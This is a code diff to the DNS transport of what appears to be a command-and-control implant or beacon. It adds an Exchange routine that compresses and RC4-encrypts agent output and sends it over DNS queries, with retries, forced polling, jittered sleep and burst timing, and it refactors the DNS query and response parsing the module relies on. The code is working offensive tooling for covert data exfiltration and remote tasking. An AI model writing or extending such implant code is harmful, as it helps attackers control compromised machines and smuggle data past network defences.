@@ -4,6 +4,9 @@
 #include "utils.h"
 #include "ApiLoader.h"
 #include "ProcLoader.h"
+#include "Agent.h"
+
+extern Agent* g_Agent;
 
 static inline void WriteBE32(BYTE* dst, ULONG val) {
     dst[0] = (BYTE)(val >> 24);
@@ -18,6 +21,26 @@ static inline ULONG ReadBE32(const BYTE* src) {
 
 static inline ULONG ReadLE32(const BYTE* src) {
     return (ULONG)src[0] | ((ULONG)src[1] << 8) | ((ULONG)src[2] << 16) | ((ULONG)src[3] << 24);
+}
+
+static USHORT ParseQtypeCode(const CHAR* qtypeStr) {
+    if (!qtypeStr || !qtypeStr[0])
+        return 16; // TXT default
+    CHAR qt[8];
+    memset(qt, 0, sizeof(qt));
+    int qi = 0;
+    while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
+        CHAR c = qtypeStr[qi];
+        if (c >= 'a' && c <= 'z')
+            c = (CHAR)(c - 'a' + 'A');
+        qt[qi++] = c;
+    }
+    qt[qi] = '\0';
+    if (qt[0] == 'A' && qt[1] == '\0')
+        return 1;
+    if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
+        return 28;
+    return 16;
 }
 
 void* ConnectorDNS::operator new(size_t sz)
@@ -284,24 +307,7 @@ BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BY
         return FALSE;
     offset += nameLen;
 
-    // Determine query type
-    USHORT qtypeCode = 16; // TXT default
-    if (qtypeStr && qtypeStr[0]) {
-        CHAR qt[8];
-        memset(qt, 0, sizeof(qt));
-        int qi = 0;
-        while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
-            CHAR c = qtypeStr[qi];
-            if (c >= 'a' && c <= 'z')
-                c = (CHAR)(c - 'a' + 'A');
-            qt[qi++] = c;
-        }
-        qt[qi] = '\0';
-        if (qt[0] == 'A' && qt[1] == '\0')
-            qtypeCode = 1;
-        else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
-            qtypeCode = 28;
-    }
+    USHORT qtypeCode = ParseQtypeCode(qtypeStr);
 
     outBuf[offset++] = (BYTE)(qtypeCode >> 8);
     outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
@@ -319,24 +325,7 @@ BOOL ConnectorDNS::ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHA
     if (!response || respLen <= 12 || !outBuf)
         return FALSE;
 
-    // Determine expected query type
-    USHORT qtypeCode = 16; // TXT default
-    if (qtypeStr && qtypeStr[0]) {
-        CHAR qt[8];
-        memset(qt, 0, sizeof(qt));
-        int qi = 0;
-        while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
-            CHAR c = qtypeStr[qi];
-            if (c >= 'a' && c <= 'z')
-                c = (CHAR)(c - 'a' + 'A');
-            qt[qi++] = c;
-        }
-        qt[qi] = '\0';
-        if (qt[0] == 'A' && qt[1] == '\0')
-            qtypeCode = 1;
-        else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
-            qtypeCode = 28;
-    }
+    USHORT qtypeCode = ParseQtypeCode(qtypeStr);
 
     // Parse DNS response
     int qdcount = (response[4] << 8) | response[5];
@@ -610,7 +599,7 @@ ULONG ConnectorDNS::BuildWireSeq(ULONG logicalSeq, ULONG signalBits)
 void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
 {
     this->resolverCount = 0;
-    ZeroMemory(this->rawResolvers, sizeof(this->rawResolvers));
+    memset(this->rawResolvers, 0, sizeof(this->rawResolvers));
     for (ULONG i = 0; i < kMaxResolvers; ++i) {
         this->resolverList[i] = NULL;
         this->resolverFailCount[i] = 0;
@@ -731,7 +720,6 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     addr.sin_port = _htons(53);
     memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
 
-    // Use pre-allocated buffer or stack fallback
     BYTE* query = this->queryBuffer;
     ULONG queryBufSize = kQueryBufferSize;
     BYTE stackQuery[4096];
@@ -739,49 +727,15 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
         query = stackQuery;
         queryBufSize = sizeof(stackQuery);
     }
-    memset(query, 0, queryBufSize);
-    USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
-    query[0] = (BYTE)(id >> 8);
-    query[1] = (BYTE)(id & 0xFF);
-    query[2] = 0x01;
-    query[3] = 0x00;
-    query[4] = 0x00;
-    query[5] = 0x01;
-
-    int offset = 12;
-    int nameLen = DnsCodec::EncodeName(qname, query + offset, queryBufSize - offset - 4);
-    if (nameLen < 0) {
+    ULONG queryLen = 0;
+    if (!BuildDnsWireQuery(qname, qtypeStr, query, queryBufSize, &queryLen)) {
         ReleaseSocket(s, TRUE);
         return FALSE;
     }
-    offset += nameLen;
-
-    // Determine query type
-    USHORT qtypeCode = 16; // TXT default
-    if (qtypeStr && qtypeStr[0]) {
-        CHAR qt[8];
-        memset(qt, 0, sizeof(qt));
-        int qi = 0;
-        while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
-            CHAR c = qtypeStr[qi];
-            if (c >= 'a' && c <= 'z')
-                c = (CHAR)(c - 'a' + 'A');
-            qt[qi++] = c;
-        }
-        qt[qi] = '\0';
-        if (qt[0] == 'A' && qt[1] == '\0')
-            qtypeCode = 1;
-        else if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
-            qtypeCode = 28;
-    }
-    query[offset++] = (BYTE)(qtypeCode >> 8);
-    query[offset++] = (BYTE)(qtypeCode & 0xFF);
-    query[offset++] = 0x00;
-    query[offset++] = 0x01;
 
     // Send query
-    int sent = this->functions->sendto(s, (const char*)query, offset, 0, (sockaddr*)&addr, sizeof(addr));
-    if (sent != offset) {
+    int sent = this->functions->sendto(s, (const char*)query, queryLen, 0, (sockaddr*)&addr, sizeof(addr));
+    if (sent != (int)queryLen) {
         ReleaseSocket(s, TRUE);
         return FALSE;
     }
@@ -796,11 +750,11 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
 
     int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
     if (selResult <= 0) {
-        ReleaseSocket(s, TRUE);  // Timeout - recreate socket next time
+        ReleaseSocket(s, TRUE);
         return FALSE;
     }
 
-    // Use pre-allocated buffer or stack fallback
+    // Receive response
     BYTE* resp = this->respBuffer;
     ULONG respBufSize = kRespBufferSize;
     BYTE stackResp[4096];
@@ -812,103 +766,20 @@ BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const 
     int addrLen = sizeof(addr);
     int recvLen = this->functions->recvfrom(s, (char*)resp, respBufSize, 0, (sockaddr*)&addr, &addrLen);
 
-    // Keep socket cached for reuse (don't close on success)
     ReleaseSocket(s, FALSE);
 
     if (recvLen <= 12)
         return FALSE;
 
-    // Parse DNS response
-    int qdcount = (resp[4] << 8) | resp[5];
-    int ancount = (resp[6] << 8) | resp[7];
-    int pos = 12;
-
-    // Skip questions
-    for (int qi = 0; qi < qdcount; ++qi) {
-        while (pos < recvLen && resp[pos] != 0) {
-            if ((resp[pos] & 0xC0) == 0xC0) {
-                pos += 2;
-                break;
-            }
-            pos += resp[pos] + 1;
-        }
-        pos++;
-        pos += 4;
-    }
-
-    // Parse answers
-    ULONG written = 0;
-    for (int ai = 0; ai < ancount; ++ai) {
-        if (pos + 12 > recvLen)
-            return FALSE;
-        if ((resp[pos] & 0xC0) == 0xC0)
-            pos += 2;
-        else {
-            while (pos < recvLen && resp[pos] != 0) {
-                pos += resp[pos] + 1;
-            }
-            pos++;
-        }
-        USHORT type = (resp[pos] << 8) | resp[pos + 1];
-        pos += 2;
-        pos += 2; // class
-        pos += 4; // TTL
-        USHORT rdlen = (resp[pos] << 8) | resp[pos + 1];
-        pos += 2;
-        if (pos + rdlen > recvLen)
-            return FALSE;
-
-        if (qtypeCode == 16 && type == 16 && rdlen > 0) {
-            // TXT record
-            USHORT consumed = 0;
-            ULONG txtWritten = 0;
-            while (consumed < rdlen) {
-                if (pos + consumed >= recvLen)
-                    break;
-                BYTE txtLen = resp[pos + consumed];
-                consumed++;
-                if (consumed + txtLen > rdlen)
-                    break;
-                if (txtLen > 0 && txtWritten + txtLen <= outBufSize) {
-                    memcpy(outBuf + txtWritten, resp + pos + consumed, txtLen);
-                    txtWritten += txtLen;
-                }
-                consumed += txtLen;
-            }
-            if (txtWritten > 0) {
-                *outSize = txtWritten;
-                return TRUE;
-            }
-        }
-        else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
-            // A record
-            if (written + 4 <= outBufSize) {
-                memcpy(outBuf + written, resp + pos, 4);
-                written += 4;
-            }
-        }
-        else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
-            // AAAA record
-            if (written + 16 <= outBufSize) {
-                memcpy(outBuf + written, resp + pos, 16);
-                written += 16;
-            }
-        }
-        pos += rdlen;
-    }
-
-    if ((qtypeCode == 1 || qtypeCode == 28) && written > 0) {
-        *outSize = written;
-        return TRUE;
-    }
-
-    return FALSE;
+    // Parse DNS response using shared helper
+    return ParseDnsWireResponse(resp, (ULONG)recvLen, qtypeStr, outBuf, outBufSize, outSize);
 }
 
-BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULONG sleepDelaySeconds)
+BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 {
+    ProfileDNS profile = *(ProfileDNS*)profilePtr;
     this->profile = profile;
-    this->sleepDelaySeconds = sleepDelaySeconds;
+    this->sleepDelaySeconds = g_Agent ? g_Agent->config->sleep_delay : 0;
 
     ParseResolvers((CHAR*)profile.resolvers);
 
@@ -929,11 +800,11 @@ BOOL ConnectorDNS::SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize, ULO
         this->labelSize = kDefaultLabelSize;
 
     if (profile.domain)
-        lstrcpynA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
+        StrLCopyA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
     else
         this->domain[0] = 0;
 
-    lstrcpynA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));
+    StrLCopyA(this->qtype, (CHAR*)"TXT", sizeof(this->qtype));
 
     if (!beat || !beatSize || beatSize < 8)
         return FALSE;
@@ -988,6 +859,162 @@ void ConnectorDNS::CloseConnector()
         this->downBuf = NULL;
         this->downTotal = 0;
         this->downFilled = 0;
+    }
+    if (this->pendingUpload && this->pendingUploadSize) {
+        MemFreeLocal((LPVOID*)&this->pendingUpload, this->pendingUploadSize);
+        this->pendingUpload = NULL;
+        this->pendingUploadSize = 0;
+    }
+}
+
+void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
+{
+    this->lastExchangeHadData = (plainData != NULL && plainSize > 0);
+
+#ifdef BEACON_DNS
+    if (g_Agent) {
+        BYTE* dnsResolvers = g_Agent->config->profile.resolvers;
+        if (dnsResolvers && dnsResolvers != (BYTE*)this->GetResolvers())
+            this->UpdateResolvers(dnsResolvers);
+
+        this->UpdateSleepDelay(g_Agent->config->sleep_delay);
+        this->UpdateBurstConfig(g_Agent->config->profile.burst_enabled, g_Agent->config->profile.burst_sleep, g_Agent->config->profile.burst_jitter);
+
+        ULONG now = this->functions->GetTickCount();
+        if (this->nextForcePollTick == 0)
+            this->nextForcePollTick = now + 1500 + (now & 0x3FF);
+
+        BOOL idle = !this->lastExchangeHadData && !this->IsBusy() && (this->pendingUpload == NULL);
+        if (idle && now >= this->nextForcePollTick) {
+            ULONG baseSleep = this->sleepDelaySeconds;
+            ULONG interval = baseSleep * 3000;
+            if (interval < 6000) interval = 6000;
+            if (interval > 60000) interval = 60000;
+            interval += (now & 0x3FF);
+            this->nextForcePollTick = now + interval;
+
+            if (!this->IsForcePollPending())
+                this->ForcePollOnce();
+        }
+    }
+#endif
+
+    // Handle pending upload retry
+    if (this->pendingUpload && this->pendingUploadSize) {
+        ULONG now = this->functions->GetTickCount();
+        if (now >= this->nextUploadAttemptTick) {
+            this->SendData(this->pendingUpload, this->pendingUploadSize);
+            if (this->lastQueryOk) {
+                MemFreeLocal((LPVOID*)&this->pendingUpload, this->pendingUploadSize);
+                this->pendingUpload = NULL;
+                this->pendingUploadSize = 0;
+                this->uploadBackoffMs = 0;
+                this->nextUploadAttemptTick = 0;
+            }
+            else {
+                ULONG base = this->uploadBackoffMs ? this->uploadBackoffMs : 500;
+                ULONG next = base * 2;
+                if (next > 30000) next = 30000;
+                this->uploadBackoffMs = next;
+                this->nextUploadAttemptTick = this->functions->GetTickCount() + this->uploadBackoffMs + (this->functions->GetTickCount() & 0x3FF);
+            }
+        }
+        else {
+            this->SendData(NULL, 0);
+        }
+    }
+    else if (plainData && plainSize > 0) {
+        BYTE* payload = plainData;
+        ULONG payloadLen = plainSize;
+        BYTE  flags = 0;
+
+        const ULONG minCompressSize = 512;
+        if (payloadLen > minCompressSize) {
+            BYTE* compBuf = NULL;
+            ULONG compLen = 0;
+            if (DnsCodec::Compress(payload, payloadLen, &compBuf, &compLen) && compBuf && compLen > 0 && compLen < payloadLen) {
+                payload = compBuf;
+                payloadLen = compLen;
+                flags = 1;
+            }
+        }
+
+        ULONG sessionLen = 1 + 4 + payloadLen;
+        BYTE* sessionBuf = (BYTE*)MemAllocLocal(sessionLen);
+        BYTE* sendBuf = NULL;
+        ULONG sendLen = 0;
+
+        if (sessionBuf) {
+            sessionBuf[0] = flags;
+            sessionBuf[1] = (BYTE)(plainSize & 0xFF);
+            sessionBuf[2] = (BYTE)((plainSize >> 8) & 0xFF);
+            sessionBuf[3] = (BYTE)((plainSize >> 16) & 0xFF);
+            sessionBuf[4] = (BYTE)((plainSize >> 24) & 0xFF);
+            memcpy(sessionBuf + 5, payload, payloadLen);
+            EncryptRC4(sessionBuf, (int)sessionLen, sessionKey, 16);
+            sendBuf = sessionBuf;
+            sendLen = sessionLen;
+        }
+        else {
+            EncryptRC4(plainData, (int)plainSize, sessionKey, 16);
+            sendBuf = plainData;
+            sendLen = plainSize;
+        }
+
+        this->SendData(sendBuf, sendLen);
+
+        // Handle failed upload - store for retry
+        if (!this->lastQueryOk && sendBuf && sendLen) {
+            this->pendingUpload = (BYTE*)MemAllocLocal(sendLen);
+            if (this->pendingUpload) {
+                memcpy(this->pendingUpload, sendBuf, sendLen);
+                this->pendingUploadSize = sendLen;
+                this->uploadBackoffMs = 500;
+                this->nextUploadAttemptTick = this->functions->GetTickCount() + this->uploadBackoffMs + (this->functions->GetTickCount() & 0x3FF);
+            }
+        }
+
+        if (sessionBuf)
+            MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
+
+        if ((flags & 0x1) && payload && payload != plainData)
+            MemFreeLocal((LPVOID*)&payload, payloadLen);
+    }
+    else {
+        this->SendData(NULL, 0);
+    }
+
+    // Decrypt received data with session key
+    if (this->recvSize > 0 && this->recvData) {
+        DecryptRC4(this->recvData, this->recvSize, sessionKey, 16);
+    }
+}
+
+void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
+{
+    BOOL isBusy = this->IsBusy();
+    BOOL burst = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;
+
+    if (burst && this->profile.burst_enabled) {
+        ULONG burstMs = this->profile.burst_sleep;
+        ULONG burstJitter = this->profile.burst_jitter;
+        if (burstMs == 0)
+            burstMs = 50;
+
+        if (burstJitter > 0 && burstJitter <= 90) {
+            ULONG jitterRange = (burstMs * burstJitter) / 100;
+            ULONG jitterDelta = this->functions->GetTickCount() % (jitterRange + 1);
+            burstMs = burstMs - (jitterRange / 2) + jitterDelta;
+            if (burstMs < 10)
+                burstMs = 10;
+        }
+        mySleep(burstMs);
+        this->ResetTrafficTotals();
+    }
+    else {
+        WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
+        if (burst)
+            this->ResetTrafficTotals();
     }
 }
 
